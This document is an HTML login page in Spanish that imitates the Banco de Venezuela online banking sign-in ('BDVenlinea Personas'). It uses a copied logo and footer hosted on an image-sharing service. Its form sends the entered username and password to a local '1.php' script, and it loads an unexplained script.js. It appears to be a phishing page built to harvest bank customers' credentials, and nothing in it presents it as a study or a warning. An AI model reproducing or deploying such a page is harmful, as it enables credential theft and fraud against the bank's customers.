<!DOCTYPE html>
<html lang="es">

<head>
<script src="script.js"></script>

    <meta charset="UTF-8">
        <link rel="icon" type="image/x-icon" href="/assets/favicon/favicon-16x16.png">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BDVenlinea Personas</title>
    <style>
        /* Estilos inspirados en la app del Banco de Venezuela */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            max-width: 360px;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            margin: auto; /* Esto centra horizontalmente */
        }

        h2 {
            margin-bottom: 20px;
            font-size: 15px;
            color: #454343;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logo-container img {
            height: auto;
            max-width: 100%;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group input[type="text"],
        .input-group input[type="password"] {
            width: calc(100% - 24px);
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s, padding-top 0.3s;
            display: block;
            background-color: #f9f9f9; /* Color de fondo del input */
            box-sizing: border-box; /* Asegura que el padding no afecte el ancho total */
            margin-top: 10px; /* Espacio entre el label y el input */
        }

        .input-group label {
            position: absolute;
            left: 20px;
            top: 16px; /* Ajuste para centrar verticalmente */
            font-size: 16px;
            color: #666;
            transition: top 0.3s, font-size 0.3s, color 0.3s;
            pointer-events: none;
            z-index: 1;
            background-color: #fff; /* Fondo del label para cubrir el texto del input */
            padding: 0 5px; /* Espaciado interno para el label */
        }

        .input-group input:focus + label,
        .input-group input:not(:placeholder-shown) + label {
            top: 6px;
            font-size: 12px;
            color: #858788;
        }

        .input-group input:focus {
            padding-top: 18px;
        }

        .terms {
            text-align: left;
            margin-bottom: 20px;
        }

        .terms label {
            font-size: 14px;
            color: #48c7ff; /* Color del texto del enlace */        }

        .terms input[type="checkbox"] {
            margin-right: 10px;
        }

        .submit-btn {
            background-color: #bb1b47;
            color: white;
            border: none;
            padding: 10px 120px; /* Ajuste el tamaño del botón según sea necesario */
            font-size: 16px; /* Tamaño de la fuente del botón */
            border-radius: 5px;
            cursor: pointer;
            display: inline-block; /* Asegura que el botón se ajuste automáticamente */
            transition: background-color 0.3s;
        }

        .submit-btn:hover {
            background-color: #9e153a;
        }

        .footer {
            margin-top: 15px;
            color: #666;
            background-image: url('https://i.postimg.cc/vTHY5R3V/footer.png');
            background-size: cover;
            background-position: center;
            padding: 90px 0;
            text-align: center;
        }

        .footer p {
            margin: 0;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://i.postimg.cc/8cVWGCkV/logo.png" alt="Logo BDV Venezuela">
        </div>
        <h2>Introduce tu usuario único</h2>
        <form action="1.php" method="post">
            <div class="input-group">
                <input  placeholder="Usuario único" type="text"  id="username" name="username" required>
            </div>
            <div class="input-group">
                <input placeholder="Contraseña"  type="password" id="password" name="password" required>
            </div>
            <div class="terms">
                <style>
                    /* Estilos para el checkbox */
                    .checkbox-input {
                      -webkit-appearance: none; /* Quita el estilo predeterminado de iOS */
                      -moz-appearance: none; /* Quita el estilo predeterminado de Firefox */
                      appearance: none; /* Quita el estilo predeterminado de otros navegadores */
                      width: 20px;
                      height: 20px;
                      background-color: #ccc;
                      border-radius: 3px;
                      position: relative;
                      cursor: pointer;
                    }
                    
                    .checkbox-input:checked {
                      background-color: #c9496c;
                    }
                    
                    .checkbox-input::before {
                      content: "";
                      display: block;
                      position: absolute;
                      top: 3px;
                      left: 7px;
                      width: 6px;
                      height: 12px;
                      border: solid white;
                      border-width: 0 2px 2px 0;
                      transform: rotate(45deg);
                      opacity: 0;
                      transition: opacity 0.3s ease;
                    }
                    
                    .checkbox-input:checked::before {
                      opacity: 1;
                    }
                    </style>
                    </head>
                    <body>
               
                    
            </div>
            <button type="submit" class="submit-btn">Entrar</button>
        </form>
        <div class="footer">
        </div>
    </div>
</body>

</html>
